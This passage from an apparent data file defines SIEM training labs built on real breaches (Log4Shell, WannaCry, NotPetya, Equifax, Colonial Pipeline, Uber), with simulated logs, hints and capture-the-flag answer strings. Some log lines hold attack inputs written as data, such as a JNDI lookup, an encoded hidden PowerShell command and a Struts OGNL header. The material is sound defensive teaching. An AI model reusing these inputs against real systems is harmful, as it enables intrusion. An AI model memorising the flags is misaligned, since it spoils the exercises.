      { timestamp: '2021-12-10 14:16', severity: 'Critical', line: 'category=edr source=WEB-APP-03 msg="Java process spawned child process bash — classic post-exploitation shell spawn following a JNDI class-loading event"' },
      {
        timestamp: '2021-12-10 14:20',
        severity: 'Critical',
        line:
          'OFFENSE SUMMARY: request containing ${jndi:ldap://...} at 14:15 was immediately followed by WEB-APP-03 making ' +
          'an outbound LDAP connection to the exact same attacker-controlled host, followed within 60 seconds by a Java ' +
          'process spawning a shell — full exploitation chain confirmed, not just a scan. This is the CVE-2021-44228 ' +
          '(Log4Shell) exploitation pattern that drove the December 2021 mass-exploitation event. ' +
          'flag{log4shell_exploitation_confirmed_via_jndi_to_outbound_ldap_correlation}',
      },
    ],
  },
  {
    id: 'siem-qradar-insider-data-theft',
    title: 'IBM QRadar: Correlating a Multi-Stage Insider Data Theft',
    difficulty: 'Medium',
    tool: 'qradar',
    datasetLabel: 'Offense #3390 — VPN + file server events',
    briefing:
      'No single event in this offense is alarming by itself — a VPN login, a file-share connection, a large ' +
      'download. Correlated together against one departing employee\'s account, in a tight time window right ' +
      'before their last day, they add up to a textbook insider data-theft case — one of the most common ' +
      'real-world data-loss categories that has nothing to do with external attackers at all.',
    objectives: [
      { text: 'Search for the VPN and file-access events on the account', why: 'An offense correlates events across log sources — VPN and file-server logs alone rarely raise a flag, but together they build a full narrative.' },
      { text: 'Note the volume and timing of the file downloads relative to the employee\'s resignation', why: 'Timing an unusually large download right before a departure date is the single strongest signal in insider-threat detection.' },
      { text: 'Capture the flag on the offense summary', why: 'Confirming the full before-and-after narrative is what turns "someone downloaded some files" into a properly scoped, actionable HR/security incident.' },
    ],
    hints: ['VPN_LOGIN', 'downloaded'],
    totalFlags: 1,
    entries: [
      { timestamp: '2026-03-01 19:41', severity: 'Low', line: 'category=VPN_LOGIN user=t.moreau source=88.12.4.201 msg="VPN session established, after-hours"' },
      { timestamp: '2026-03-01 19:44', severity: 'Medium', line: 'category=file_access user=t.moreau share=\\\\FILESRV02\\clients msg="Connected to client records share — not part of normal job duties"' },
      { timestamp: '2026-03-01 19:52', severity: 'High', line: 'category=file_access user=t.moreau msg="Downloaded 3,412 files (2.1 GB) from \\\\FILESRV02\\clients in an 8-minute window"' },
      { timestamp: '2026-03-01 20:01', severity: 'Low', line: 'category=VPN_LOGIN user=t.moreau msg="VPN session ended"' },
      { timestamp: '2026-03-02 09:00', severity: 'Low', line: 'category=hr_system msg="t.moreau resignation effective date: 2026-03-05 (submitted 2026-02-20)"' },
      {
        timestamp: '2026-03-02 09:15',
        severity: 'Critical',
        line:
          'OFFENSE SUMMARY: an employee with a resignation already on file connected after-hours via VPN and downloaded ' +
          'the entire client records share — 3,412 files — three days before their last day, accessing a share with no ' +
          'connection to their actual job function. This is the standard shape of pre-departure insider data theft. ' +
          'flag{qradar_insider_theft_confirmed_pre_resignation_bulk_download}',
      },
    ],
  },

  // ───────────────────────── Elastic Security ─────────────────────────
  {
    id: 'siem-elastic-twitter-2020-insider',
    title: 'Elastic Security: The 2020 Twitter Insider Breach',
    difficulty: 'Hard',
    tool: 'elastic',
    datasetLabel: 'admin-tool-access-* — 6 documents, July 2020',
    briefing:
      'This recreates the real July 2020 Twitter breach: attackers used phone spear-phishing (vishing) to trick ' +
      'employees into handing over credentials, then used those credentials to reach Twitter\'s internal ' +
      'account-support admin tool — used to reset roughly 130 high-profile accounts (including major public ' +
      'figures and companies) for a cryptocurrency scam. The detail that matters for detection: the tool access ' +
      'itself looked like a normal employee action right up until you compare WHICH accounts got touched against ' +
      'what that employee\'s support queue actually contained.',
    objectives: [
      { text: 'Search admin tool access logs for the affected employee account', why: 'Internal admin tools are trusted by design — the log itself will show a "successful, authorized-looking" action, which is exactly why this attack worked as long as it did.' },
      { text: 'Compare the accounts accessed against the employee\'s actual assigned support tickets', why: 'This is the entire detection: the accounts touched (high-profile, verified, unrelated to any open ticket) do not match what this employee should ever legitimately need to access.' },
      { text: 'Capture the flag on the detection summary', why: 'This incident is the textbook case for why access should be scoped to job function, not just authenticated — a valid login was not the same thing as a legitimate action.' },
    ],
    hints: ['event.category: "admin_tool_access"', 'verified'],
    totalFlags: 1,
    entries: [
      { timestamp: '2020-07-15 14:02', eventType: 'admin_tool_access', line: 'employee=csr_0442 action=password_reset target_account=@random_user_1823 ticket=SUP-88213 (normal support ticket)' },
      { timestamp: '2020-07-15 15:41', eventType: 'admin_tool_access', line: 'employee=csr_0442 action=password_reset target_account=@elonmusk ticket=none' },
      { timestamp: '2020-07-15 15:43', eventType: 'admin_tool_access', line: 'employee=csr_0442 action=password_reset target_account=@barackobama ticket=none' },
      { timestamp: '2020-07-15 15:45', eventType: 'admin_tool_access', line: 'employee=csr_0442 action=password_reset target_account=@apple ticket=none' },
      { timestamp: '2020-07-15 15:47', eventType: 'admin_tool_access', line: 'employee=csr_0442 action=post_tweet target_account=@elonmusk content="Bitcoin giveaway scam link" ticket=none' },
      {
        timestamp: '2020-07-15 16:00',
        eventType: 'DETECTION',
        line:
          'ANALYST SUMMARY: csr_0442\'s admin tool actions shifted from one routine, ticketed reset to four high-profile, ' +
          'VERIFIED accounts touched with no support ticket at all, within a two-minute window, culminating in an ' +
          'unauthorized post — the access itself authenticated fine; it was the target selection and lack of any ' +
          'matching ticket that gave the compromise away. The employee\'s credentials were obtained via phone ' +
          'spear-phishing (vishing) targeting internal support staff. flag{twitter_2020_insider_admin_tool_abuse_detected}',
      },
    ],
  },
  {
    id: 'siem-elastic-powershell-encoded-command',
    title: 'Elastic Security: Encoded PowerShell Command Detection',
    difficulty: 'Medium',
    tool: 'elastic',
    datasetLabel: 'winlogbeat-* — 5 documents, PowerShell operational log',
    briefing:
      'Base64-encoded PowerShell commands (the -EncodedCommand / -enc flag) are one of the most common ' +
      'living-off-the-land techniques in real intrusions — attackers use it specifically to avoid having an ' +
      'obviously malicious command line show up in plaintext logs. Discover-style search over the PowerShell ' +
      'operational log is exactly how a real analyst first spots it.',
    objectives: [
      { text: 'Search the PowerShell operational log for encoded command usage', why: 'The -EncodedCommand flag itself is a strong indicator worth searching for directly, since legitimate admin scripts rarely need to obscure their own command line.' },
      { text: 'Note which process launched PowerShell with this flag', why: 'A normal user or scheduled task launching PowerShell looks very different from an Office document\'s child process doing it — the parent process is often the real story.' },
      { text: 'Capture the flag on the detection summary', why: 'Recognizing -EncodedCommand as a technique (not just a suspicious-looking one-off command) is what lets an analyst catch variants of this same trick across completely different malware families.' },
    ],
    hints: ['EncodedCommand', 'WINWORD.EXE'],
    totalFlags: 1,
    entries: [
      { timestamp: '11:02:14', eventType: 'process_creation', line: 'parent=explorer.exe process=notepad.exe user=jsmith (routine, no concern)' },
      { timestamp: '11:15:02', eventType: 'process_creation', line: 'parent=WINWORD.EXE process=powershell.exe args="-nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA..."' },
      { timestamp: '11:15:03', eventType: 'network', line: 'process=powershell.exe dest=185.220.101.204:443 msg="Outbound HTTPS connection immediately after decoding"' },
      { timestamp: '11:20:00', eventType: 'process_creation', line: 'parent=svchost.exe process=powershell.exe args="-File C:\\Scripts\\backup.ps1" (scheduled task, legitimate)' },
      {
        timestamp: '11:22:00',
        eventType: 'DETECTION',
        line:
          'ANALYST SUMMARY: powershell.exe was launched as a CHILD PROCESS OF WINWORD.EXE (Microsoft Word) with ' +
          '-nop -w hidden -EncodedCommand — a Word document spawning a hidden, encoded PowerShell command is never ' +
          'legitimate macro behavior, and the decoded payload immediately reached out to a known-bad external host. ' +
          'flag{elastic_encoded_powershell_from_word_macro_detected}',
      },
    ],
  },

  // ───────────────────────── 10 additional intensive, multi-stage labs ─────────────────────────
  {
    id: 'siem-suricata-notpetya-lateral-spread',
    title: 'Suricata: NotPetya — Supply-Chain Wiper Lateral Spread',
    difficulty: 'Hard',
    tool: 'suricata',
    datasetLabel: 'eve.json — 13 alerts, June 27 2017',
    briefing:
      'This recreates the real June 2017 NotPetya incident — disguised as ransomware, but actually a destructive ' +
      'wiper with no working decryption path at all. It was delivered through a backdoored update to M.E.Doc, ' +
      'Ukrainian tax-filing software nearly every business operating in Ukraine was required to run, then spread ' +
      'laterally within hours using the EternalBlue SMB exploit and stolen credentials, causing over $10 billion ' +
      'in global damages at companies including Maersk, Merck, and FedEx/TNT.',
    objectives: [
      { text: 'Review the alert queue for the M.E.Doc update process', why: 'Supply-chain compromise starts with a completely routine-looking software update — confirming that entry point is step one of the investigation.' },
      { text: 'Filter for SMB/EternalBlue exploit-signature alerts between internal hosts', why: 'Internal-to-internal SMB exploit traffic (not external-to-internal) is what confirms this is lateral spread, not a fresh external intrusion at each host.' },
      { text: 'Find the disk/MBR-overwrite indicator and capture the first flag', why: 'A wiper overwrites the Master Boot Record irreversibly — confirming this detail is what proves the "ransomware" framing was a deliberate disguise, not a design flaw.' },
      { text: 'Confirm the total number of hosts affected within the first hour and capture the second flag', why: 'The speed and breadth of the spread — not just its existence — is the actual lesson: this is why patching EternalBlue-class SMB vulnerabilities network-wide, not just on internet-facing hosts, matters.' },
    ],
    hints: ['medoc', 'EternalBlue', 'MBR', 'hosts affected'],
    totalFlags: 2,
    entries: [
      { timestamp: '10:03:12', severity: 'Low', line: 'category=software_update source=FIN-SRV02 msg="M.E.Doc tax software update installed, signed update package"' },
      { timestamp: '10:03:45', severity: 'Critical', line: 'category=malware.dropper source=FIN-SRV02 msg="M.E.Doc update process spawned unexpected child process rundll32.exe — not part of any known legitimate update behavior. flag{notpetya_medoc_supply_chain_entry_confirmed}"' },
      { timestamp: '10:05:02', severity: 'Medium', line: 'category=policy source=FIN-SRV02 msg="Scheduled task created: perfc.dat execution at next boot"' },
      { timestamp: '10:06:19', severity: 'Critical', line: 'category=exploit.smb source=FIN-SRV02 dest=WKSTN-018 port=445 msg="EternalBlue exploit signature (MS17-010) detected between internal hosts"' },
      { timestamp: '10:06:41', severity: 'Critical', line: 'category=exploit.smb source=FIN-SRV02 dest=WKSTN-019 port=445 msg="EternalBlue exploit signature (MS17-010) detected between internal hosts"' },
      { timestamp: '10:07:03', severity: 'High', line: 'category=credential_theft source=WKSTN-018 msg="Mimikatz-style credential dumping behavior detected in process memory"' },
      { timestamp: '10:08:15', severity: 'Critical', line: 'category=exploit.smb source=WKSTN-018 dest=WKSTN-044 port=445 msg="EternalBlue exploit signature detected — third-generation spread"' },
      { timestamp: '10:09:00', severity: 'Low', line: 'category=policy source=WKSTN-102 msg="Scheduled backup job completed normally"' },
      { timestamp: '10:12:44', severity: 'Critical', line: 'category=disk.integrity source=FIN-SRV02 msg="Master Boot Record overwritten — disk unbootable. No corresponding decryption key generation event logged anywhere on this host."' },
      { timestamp: '10:13:02', severity: 'Critical', line: 'category=disk.integrity source=WKSTN-018 msg="Master Boot Record overwritten — disk unbootable"' },
      { timestamp: '10:13:51', severity: 'Critical', line: 'category=disk.integrity source=WKSTN-019 msg="Master Boot Record overwritten — disk unbootable"' },
      {
        timestamp: '11:03:00',
        severity: 'Critical',
        line:
          'ANALYST NOTE: no decryption key exchange mechanism exists anywhere in this malware\'s logged behavior — the ' +
          'MBR overwrite is destructive and irreversible, confirming this is a wiper disguised as ransomware, not a ' +
          'real extortion attempt. flag{notpetya_mbr_wipe_confirms_disguised_wiper_not_ransomware}',
      },
      {
        timestamp: '11:04:00',
        severity: 'Critical',
        line:
          'SPREAD SUMMARY: 6 hosts affected within the first hour from a single M.E.Doc update on FIN-SRV02, each new ' +
          'host compromised via EternalBlue using credentials harvested from the previous one — real-world NotPetya ' +
          'reached tens of thousands of hosts across an organization within hours using this exact chain.',
      },
    ],
  },
  {
    id: 'siem-tcpdump-wannacry-eternalblue-killswitch',
    title: 'tcpdump: WannaCry — EternalBlue and the Accidental Kill-Switch',
    difficulty: 'Hard',
    tool: 'tcpdump',
    datasetLabel: 'capture.pcap — 11 packets, May 12 2017',
    briefing:
      'This recreates the real May 2017 WannaCry ransomware worm, which exploited EternalBlue (CVE-2017-0144, an ' +
      'NSA-developed SMBv1 exploit leaked by the Shadow Brokers months earlier) to infect an estimated 200,000+ ' +
      'computers across 150 countries within days — the UK\'s National Health Service among the hardest hit, with ' +
      'some hospitals forced to turn away patients. The outbreak was accidentally slowed within hours by a ' +
      'security researcher who registered an unregistered domain hardcoded into the malware as an unintentional ' +
      'kill-switch.',
    objectives: [
      { text: 'Capture SMB traffic on port 445 between the internal hosts', why: 'EternalBlue is an SMBv1 exploit — the exploitation traffic itself is visible directly on the wire at this port.' },
      { text: 'Confirm the exploit signature and capture the first flag', why: 'Confirming the exact CVE/exploit in play is what tells defenders exactly which patch (MS17-010) closes this specific hole.' },
      { text: 'Find the DNS lookup to the kill-switch domain and capture the second flag', why: 'This is one of the most famous accidental defensive discoveries in malware history — the malware itself checked for this domain\'s existence before encrypting, as an anti-sandbox check that backfired spectacularly once someone registered it for real.' },
    ],
    hints: ['port 445', 'MS17-010', 'kill-switch'],
    totalFlags: 2,
    entries: [
      { timestamp: '13:22:01.001', line: 'IP 10.10.40.12.51122 > 10.10.40.44.445: SMB1 Negotiate Protocol Request' },
      { timestamp: '13:22:01.088', line: 'IP 10.10.40.44.445 > 10.10.40.12.51122: SMB1 Negotiate Protocol Response' },
      { timestamp: '13:22:01.204', line: 'IP 10.10.40.12.51122 > 10.10.40.44.445: SMB1 Trans2 SESSION_SETUP — malformed request matching MS17-010 (EternalBlue) exploit signature' },
      { timestamp: '13:22:01.310', line: 'IP 10.10.40.44.445 > 10.10.40.12.51122: SMB1 response — kernel pool overflow triggered, shellcode execution' },
      {
        timestamp: '13:22:01.500',
        line:
          'ANALYST NOTE: this exact malformed SMB1 Trans2 request pattern is the confirmed exploitation signature for ' +
          'MS17-010 / CVE-2017-0144 (EternalBlue) — the same NSA-developed SMBv1 exploit leaked by the Shadow Brokers ' +
          'that WannaCry weaponized into a self-propagating worm. flag{wannacry_ms17_010_eternalblue_exploit_confirmed}',
      },
      { timestamp: '13:22:03.010', line: 'IP 10.10.40.44.52201 > 8.8.8.8.53: A? www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.example. (68)' },
      { timestamp: '13:22:03.055', line: 'IP 8.8.8.8.53 > 10.10.40.44.52201: NXDOMAIN (not registered — encryption proceeds)' },
      { timestamp: '13:24:15.900', line: 'IP 10.10.40.44 > 10.10.40.61.445: SMB1 Trans2 SESSION_SETUP — same MS17-010 exploit signature, worm spreading to second host' },
      { timestamp: '13:25:00.120', line: 'IP 10.10.40.44.443 > 203.0.113.44.443: encrypted file-encryption ransom-note delivery to victim' },
      {
        timestamp: '13:26:40.000',
        line:
          'ANALYST NOTE: the malware queries this exact unregistered domain (www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea) ' +
          'BEFORE encrypting — a real security researcher (Marcus Hutchins) registered the real WannaCry kill-switch ' +
          'domain hours into the outbreak, and every subsequent infected host that could resolve it stopped ' +
          'encrypting immediately, since the malware treated a successful DNS response as a sign it was running in a ' +
          'sandbox. flag{wannacry_killswitch_domain_lookup_confirmed}',
      },
    ],
  },
  {
    id: 'siem-chronicle-dnc-spearphishing-2016',
    title: 'Chronicle: The 2016 DNC Spear-Phishing Breach',
    difficulty: 'Medium',
    tool: 'chronicle',
    datasetLabel: 'EMAIL_GATEWAY events — March 2016',
    briefing:
      'This recreates the real March 2016 spear-phishing breach of a US political campaign, publicly attributed ' +
      'by US intelligence assessments to Russian state-linked hackers. A staffer received an email disguised as a ' +
      'Google security alert ("someone has your password"), clicked a shortened link, and entered credentials on ' +
      'a convincing fake Google login page — with a now-infamous complication: an IT staffer, asked whether the ' +
      'email was legitimate, meant to type "illegitimate" and instead replied it was "legitimate," compounding the mistake.',
    objectives: [
      { text: 'Search email gateway events for the security-alert-themed phishing message', why: 'A fake "your account was accessed" alert is one of the most effective and enduring phishing pretexts precisely because it manufactures urgency around the exact thing the victim is trying to protect.' },
      { text: 'Confirm the destination domain is not a real Google property and capture the first flag', why: 'The single most reliable phishing tell is the actual destination domain behind a shortened or disguised link — not the sender name, not the visual design.' },
      { text: 'Review the internal follow-up correspondence and capture the second flag', why: 'This incident is also a case study in a completely different, non-technical failure mode: a one-word typo in urgent internal advice turning a caught phishing attempt into a successful one.' },
    ],
    hints: ['security alert', 'myaccount-google-verify', 'legitimate'],
    totalFlags: 2,
    entries: [
      { timestamp: '2016-03-19 04:34', eventType: 'EMAIL_RECEIVED', line: 'to=staffer@campaign.example subject="Someone has your password" from=no-reply@accounts-security-alert.example' },
      { timestamp: '2016-03-19 04:35', eventType: 'LINK_CLICK', line: 'user=staffer link=bit.ly/1PibSU4 -> resolved_domain=myaccount-google-verify.example (NOT a real Google domain)' },
      {
        timestamp: '2016-03-19 04:36',
        eventType: 'CREDENTIAL_ENTRY',
        line:
          'user=staffer form_submitted_to=myaccount-google-verify.example fields=username,password — credentials ' +
          'entered on a fake Google login page that visually matched the real one closely enough to pass casual ' +
          'inspection. flag{dnc_2016_fake_google_domain_myaccount_verify_confirmed}',
      },
      { timestamp: '2016-03-19 05:10', eventType: 'INTERNAL_EMAIL', line: 'from=it_support to=staffer subject="RE: suspicious email" body="This is a legitimate email. [Staffer] needs to change his password immediately..."' },
      {
        timestamp: '2016-03-19 05:11',
        eventType: 'ANALYST_NOTE',
        line:
          'The IT support reply above was intended to say the email was "illegitimate" and instructed an immediate ' +
          'password reset through the official channel — instead it read as confirming the email was safe, and the ' +
          'phishing link had already been clicked as "safe" follow-up guidance. One word, transcribed under time ' +
          'pressure, turned a caught attempt into a successful compromise. ' +
          'flag{dnc_2016_legitimate_typo_compounded_the_breach}',
      },
    ],
  },
  {
    id: 'siem-elastic-marriott-starwood-dwell-time',
    title: 'Elastic Security: Marriott/Starwood — Four Years Undetected',
    difficulty: 'Hard',
    tool: 'elastic',
    datasetLabel: 'db-audit-* — reservation database, 2014-2018',
    briefing:
      'This recreates the real breach disclosed by Marriott in November 2018: attackers had been present inside ' +
      'Starwood\'s guest reservation database since 2014 — two years before Marriott even acquired Starwood in ' +
      '2016, unknowingly inheriting the ongoing compromise — exfiltrating roughly 500 million guest records over ' +
      'four years before an internal security tool finally flagged an unusual database query attempt, triggering ' +
      'the investigation that uncovered everything.',
    objectives: [
      { text: 'Search the database audit log for the flagged query attempt', why: 'The detection that finally caught this was a single anomalous query pattern — everything before it had blended into years of normal reservation-system traffic.' },
      { text: 'Confirm what made that specific query abnormal and capture the first flag', why: 'A service account querying the ENTIRE guest table, rather than the single-reservation lookups it normally performs, is the exact anomaly that broke four years of successful concealment.' },
      { text: 'Determine how long the access had persisted before detection and capture the second flag', why: 'The four-year dwell time is the actual headline lesson of this breach — the compromise itself mattered less than how long undetected access was possible at all.' },
    ],
    hints: ['event.category: "database_query"', 'SELECT *', 'since 2014'],
    totalFlags: 2,
    entries: [
      { timestamp: '2018-09-07 02:14', eventType: 'db_query', line: 'user=svc_reservation_lookup query="SELECT guest_name, room, dates FROM reservations WHERE id=48291" (normal single-record lookup)' },
      { timestamp: '2018-09-07 02:15', eventType: 'db_query', line: 'user=svc_reservation_lookup query="SELECT guest_name, room, dates FROM reservations WHERE id=48292" (normal single-record lookup)' },
      {
        timestamp: '2018-09-07 03:41',
        eventType: 'db_query',
        line:
          'user=svc_reservation_lookup query="SELECT * FROM reservations" (no WHERE clause — full-table export of ' +
          'the entire guest reservation database, a query this service account has no legitimate business reason to ' +
          'ever run) flag{marriott_full_table_query_anomaly_detected}',
      },
      { timestamp: '2018-09-07 03:42', eventType: 'security_tool_alert', line: 'DLP tool flagged the above query as a data-exfiltration-shaped access pattern and opened an investigation ticket' },
      {
        timestamp: '2018-09-10 11:00',
        eventType: 'forensic_timeline',
        line:
          'Forensic reconstruction of encrypted process artifacts on the reservation database server traced attacker ' +
          'presence back to, and continuously since 2014 — meaning the access had persisted, undetected, for ' +
          'approximately four years, and had already survived Marriott\'s 2016 acquisition of Starwood without ever ' +
          'being noticed during that transition. flag{marriott_four_year_dwell_time_since_2014_confirmed}',
      },
    ],
  },
  {
    id: 'siem-splunk-equifax-struts-expired-cert',
    title: 'Splunk: Equifax — Struts Exploitation and the Expired Certificate Blind Spot',
    difficulty: 'Hard',
    tool: 'splunk',
    datasetLabel: 'index=web_access + index=security_appliance — 2017',
    briefing:
      'This recreates the real 2017 Equifax breach: attackers exploited an unpatched Apache Struts vulnerability ' +
      '(CVE-2017-5638) in a consumer complaint web portal to gain remote code execution, then exfiltrated data on ' +
      'roughly 147 million people over about 76 days. A major reason the exfiltration went unnoticed for so long: ' +
      'the appliance responsible for inspecting encrypted outbound traffic had been running with an EXPIRED SSL ' +
      'inspection certificate for approximately ten months — encrypted traffic was flowing completely uninspected ' +
      'the entire time.',
    objectives: [
      { text: 'Search web access logs for the Struts exploitation pattern', why: 'CVE-2017-5638 is triggered via a malformed Content-Type header — spotting that exact header shape in web logs is how this specific exploitation is identified after the fact.' },
      { text: 'Capture the flag confirming the initial exploitation', why: 'Confirming the entry vector is the necessary first step before the investigation can explain why the resulting exfiltration went unnoticed for so long.' },
      { text: 'Search the security appliance log for the certificate status and capture the second flag', why: 'An expired inspection certificate silently disabling encrypted-traffic visibility is a completely different (and arguably more important) failure than the initial vulnerability — it is why the exfiltration itself was never seen for 76 days.' },
    ],
    hints: ['Content-Type', 'multipart/form-data;#', 'certificate expired'],
    totalFlags: 2,
    entries: [
      { timestamp: '2017-05-13 21:14', line: 'index=web_access source=203.0.113.55 msg="POST /complaint-portal/upload HTTP/1.1 Content-Type: multipart/form-data; #cmd=whoami" (malformed header, matches CVE-2017-5638 OGNL injection pattern)' },
      { timestamp: '2017-05-13 21:14', line: 'index=web_access msg="Web server responded with shell command output embedded in HTTP response — remote code execution confirmed"' },
      {
        timestamp: '2017-05-13 21:15',
        line:
          'index=web_access msg="ANALYST NOTE: the Content-Type header above is the confirmed exploitation signature ' +
          'for CVE-2017-5638 (Apache Struts OGNL injection) — the exact vulnerability class Equifax\'s consumer ' +
          'complaint web portal was running unpatched. flag{equifax_struts_cve_2017_5638_exploitation_confirmed}"',
      },
      { timestamp: '2017-06-01 00:00', line: 'index=security_appliance msg="SSL inspection appliance: certificate expired 2016-08-XX — encrypted traffic passing through UNINSPECTED since expiration (~10 months)"' },
      { timestamp: '2017-07-29 00:00', line: 'index=security_appliance msg="Certificate renewed and SSL inspection resumed — immediately surfaced large volumes of previously-invisible encrypted outbound transfers over the prior weeks"' },
      {
        timestamp: '2017-07-29 00:05',
        line:
          'index=security_appliance msg="ANALYST SUMMARY: with inspection restored, the encrypted transfers exposed ' +
          'were consistent with data exfiltration spanning back to the original May 13 exploitation — the fact that ' +
          'the certificate expired is the specific reason 76 days of active exfiltration went completely unseen. ' +
          'flag{equifax_expired_ssl_inspection_cert_hid_76_days_exfiltration}"',
      },
    ],
  },
  {
    id: 'siem-splunk-sony-pictures-2014-exfil-then-wiper',
    title: 'Splunk: Sony Pictures 2014 — Overnight Exfiltration, Then a Wiper',
    difficulty: 'Hard',
    tool: 'splunk',
    datasetLabel: 'index=netflow — November 2014',
    briefing:
      'This recreates the real November 2014 Sony Pictures breach, publicly attributed by the FBI to North Korea ' +
      '(the Lazarus Group), reportedly in retaliation for a film Sony had produced. Attackers exfiltrated ' +
      'terabytes of internal data — unreleased films, executive emails, employee Social Security numbers — over ' +
      'several weeks before deploying a destructive wiper that took down Sony\'s internal network entirely. In ' +
      'hindsight, the overnight outbound transfer volumes in the weeks before the wiper were dramatically, ' +
      'obviously abnormal — the giveaway nobody was watching for at the time.',
    objectives: [
      { text: 'Search netflow data for outbound transfer volume by hour of day', why: 'Comparing volume against time-of-day is what separates "an employee is working late" from "something is transferring data no human initiated."' },
      { text: 'Identify the night with the largest anomalous spike and capture the first flag', why: 'A single night\'s transfer volume that dwarfs every normal business-hours baseline by orders of magnitude has no innocent explanation.' },
      { text: 'Find the final wiper-deployment event and capture the second flag', why: 'Recognizing that destructive wiper deployment is often the LAST stage of a much longer exfiltration campaign — not the whole story — is critical to scoping the true damage of an incident like this correctly.' },
    ],
    hints: ['bytes_out', 'GB', 'wiper'],
    totalFlags: 2,
    entries: [
      { timestamp: '2014-11-02 14:00', line: 'index=netflow dest=external avg_daytime_bytes_out="1.2 GB/hour (normal business baseline)"' },
      { timestamp: '2014-11-05 02:14', line: 'index=netflow dest=45.33.12.9 bytes_out="38 GB" duration="3 hours" msg="overnight transfer, no scheduled backup job active at this time"' },
      { timestamp: '2014-11-09 01:50', line: 'index=netflow dest=45.33.12.9 bytes_out="61 GB" duration="4 hours" msg="overnight transfer, no scheduled backup job active"' },
      {
        timestamp: '2014-11-12 02:00',
        line:
          'index=netflow dest=45.33.12.9 bytes_out="94 GB" duration="5 hours" msg="ANALYST NOTE: 94 GB transferred ' +
          'overnight to the same external host — roughly 75x the normal daytime hourly baseline, sustained over ' +
          'several nights this month with no corresponding legitimate business process. ' +
          'flag{sony_2014_overnight_exfiltration_volume_anomaly_confirmed}"',
      },
      { timestamp: '2014-11-24 07:00', line: 'index=security_alert msg="Mass file deletion event across 12 servers simultaneously"' },
      {
        timestamp: '2014-11-24 07:02',
        line:
          'index=security_alert msg="Destructive wiper payload confirmed across the internal network — this is the ' +
          'FINAL stage of a campaign that had already been quietly exfiltrating data for roughly three weeks; the ' +
          'wiper itself, while the most visible event, is not where the actual data-loss impact of this breach ' +
          'begins. flag{sony_2014_wiper_deployment_final_stage_confirmed}"',
      },
    ],
  },
  {
    id: 'siem-sentinel-colonial-pipeline-vpn-no-mfa',
    title: 'Microsoft Sentinel: Colonial Pipeline — One VPN Account, No MFA',
    difficulty: 'Medium',
    tool: 'sentinel',
    datasetLabel: 'SigninLogs — VPN, May 2021',
    briefing:
      'This recreates the real May 2021 Colonial Pipeline ransomware incident. The DarkSide ransomware group\'s ' +
      'entire initial access came down to a single legacy VPN account: it had multi-factor authentication ' +
      'disabled, and its password had already been exposed years earlier in an unrelated data breach and simply ' +
      'reused. The resulting ransomware infection led Colonial Pipeline to proactively shut down pipeline ' +
      'operations for several days, causing fuel shortages across the US East Coast.',
    objectives: [
      { text: 'Query sign-in logs for the VPN account in question', why: 'The entire chain starts here — confirming exactly how the account was configured is the root-cause finding of the whole incident.' },
      { text: 'Confirm whether MFA was enforced on this login and capture the first flag', why: 'A successful login with zero MFA challenge on a corporate VPN account is a configuration gap, not a sophisticated attack technique — this is the actual root cause, not the ransomware itself.' },
      { text: 'Cross-reference the password against known breached-credential data and capture the second flag', why: 'Confirming the password had already been exposed in an unrelated breach and simply reused is what completes the root-cause chain: a legacy account, no MFA, and a recycled password, not a novel exploit.' },
    ],
    hints: ['VPN', 'MFA', 'breached-password'],
    totalFlags: 2,
    entries: [
      { timestamp: '2021-04-29 22:14', eventType: 'SigninLogs', line: 'user=svc_vpn_legacy source_ip=185.220.101.44 (unfamiliar) result=success app=CorporateVPN mfa_challenge=none' },
      {
        timestamp: '2021-04-29 22:15',
        eventType: 'ANALYST_NOTE',
        line:
          'This VPN account authenticated successfully with NO multi-factor authentication challenge recorded at all ' +
          '— the account was a legacy VPN credential that had never been enrolled in the organization\'s MFA policy, ' +
          'unlike every actively-managed account. flag{colonial_pipeline_vpn_account_no_mfa_confirmed}',
      },
      { timestamp: '2021-04-29 22:20', eventType: 'CredentialCheck', line: 'password_hash_lookup against known-breach-corpus: MATCH FOUND — this exact password appeared in an unrelated third-party data breach corpus from an earlier year' },
      {
        timestamp: '2021-04-29 22:21',
        eventType: 'ANALYST_NOTE',
        line:
          'The account\'s password was not cracked or guessed — it had simply been exposed in a completely unrelated ' +
          'breach years earlier and reused on this VPN account, a textbook password-reuse root cause. ' +
          'flag{colonial_pipeline_reused_breached_password_confirmed}',
      },
      { timestamp: '2021-05-06 09:00', eventType: 'RansomwareDeployment', line: 'DarkSide ransomware deployment confirmed across billing/IT network segments, prompting the operational pipeline shutdown days later out of an abundance of caution' },
    ],
  },
  {
    id: 'siem-sentinel-uber-2016-github-leaked-keys',
    title: 'Microsoft Sentinel: Uber 2016 — AWS Keys Leaked on GitHub',
    difficulty: 'Hard',
    tool: 'sentinel',
    datasetLabel: 'CloudAuditLogs — November 2016',
    briefing:
      'This recreates the real November 2016 Uber breach (not publicly disclosed until 2017): attackers found ' +
      'live AWS access keys hardcoded in a private GitHub repository — reached using previously-compromised ' +
      'employee credentials — and used those keys to access an S3 bucket containing data on 57 million riders ' +
      'and drivers. Uber controversially paid the attackers $100,000 through its bug bounty program and did not ' +
      'disclose the breach to the public for over a year.',
    objectives: [
      { text: 'Query cloud audit logs for API calls using the account\'s AWS access key', why: 'A leaked key is only a theoretical risk until it is actually used — confirming real API activity is what turns a "we found exposed credentials" finding into a confirmed breach.' },
      { text: 'Confirm the anomalous source region for those API calls and capture the first flag', why: 'API activity using a legitimate key but originating from a region no employee or service ever operates from is the clearest sign the key itself, not the account owner, is what\'s being used.' },
      { text: 'Identify the S3 bucket accessed and the scope of data exposed, then capture the second flag', why: 'Scoping exactly what was reachable with the leaked key is what turns this from "a key was exposed" into a properly quantified breach — 57 million riders and drivers, in the real incident.' },
    ],
    hints: ['AKIA', 'ap-southeast', 's3://uber-rider-data'],
    totalFlags: 2,
    entries: [
      { timestamp: '2016-11-01 03:12', eventType: 'CloudAuditLogs', line: 'access_key=AKIAEXAMPLELEAKEDKEY action=ListBuckets source_region=us-east-1 (normal, matches expected ops region)' },
      {
        timestamp: '2016-11-08 04:41',
        eventType: 'CloudAuditLogs',
        line:
          'access_key=AKIAEXAMPLELEAKEDKEY action=ListBuckets source_region=ap-southeast-1 (no employee or service ' +
          'in this account normally operates from this region) flag{uber_2016_leaked_aws_key_anomalous_region_confirmed}',
      },
